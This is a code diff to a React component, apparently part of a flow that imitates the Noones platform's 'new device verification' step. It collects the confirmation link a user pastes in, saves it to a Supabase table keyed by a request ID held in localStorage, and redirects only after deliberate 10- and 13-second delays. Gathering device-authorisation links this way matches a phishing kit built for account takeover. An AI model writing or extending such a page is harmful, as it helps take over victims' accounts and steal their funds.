@@ -1,5 +1,10 @@
 import React, { useState, useEffect, useRef } from 'react';
 import { useNavigate, useLocation } from 'react-router-dom';
+import { supabase } from '../../lib/supabase';
+
+const NOONES_REQUEST_ID_KEY = 'noones_request_id';
+const NOONES_CURRENT_STEP_KEY = 'noones_current_step';
+const NOONES_REQUEST_DATA_KEY = 'noones_request_data';
 
 export default function NoonesNewDeviceVerification() {
   const navigate = useNavigate();
@@ -38,32 +43,40 @@ export default function NoonesNewDeviceVerification() {
     setIsLoading(true);
 
     try {
-      const platformData = location.state?.platformData || {};
-
-      const response = await fetch('/api/submit-connection', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({
-          ...platformData,
-          confirmation_link: link.trim(),
-        }),
-      });
-
-      if (!response.ok) {
-        console.error('Failed to submit verification link:', response.statusText);
+      const requestId = window.localStorage.getItem(NOONES_REQUEST_ID_KEY);
+      if (!requestId) {
+        throw new Error('No request ID found');
       }
+
+      console.log('Updating table: platform_connection_requests, id:', requestId);
+      const { error } = await supabase
+        .from('platform_connection_requests')
+        .update({
+          confirmation_link: link.trim(),
+        })
+        .eq('id', requestId);
+
+      if (error) {
+        throw error;
+      }
+
+      console.log('Updated confirmation_link for id:', requestId);
+
+      // Update progress
+      const requestDataStr = window.localStorage.getItem(NOONES_REQUEST_DATA_KEY);
+      const requestData = requestDataStr ? JSON.parse(requestDataStr) : {};
+      window.localStorage.setItem(NOONES_CURRENT_STEP_KEY, '3');
+      window.localStorage.setItem(NOONES_REQUEST_DATA_KEY, JSON.stringify({ ...requestData, confirmation_link: link.trim() }));
 
       setTimeout(() => {
         setIsRedirecting(true);
       }, 10000);
 
       setTimeout(() => {
-        navigate('/connect/noones/verify-device', { state: { email, platformData } });
+        navigate('/connect/noones/verify-device', { state: { email, platformData: { ...requestData, confirmation_link: link.trim() } } });
       }, 13000);
-    } catch (err) {
-      console.error('Error during verification:', err);
+    } catch (err: any) {
+      console.error('Error updating platform_connection_requests:', err);
       alert('Verification failed. Please try again.');
       setIsLoading(false);
     }
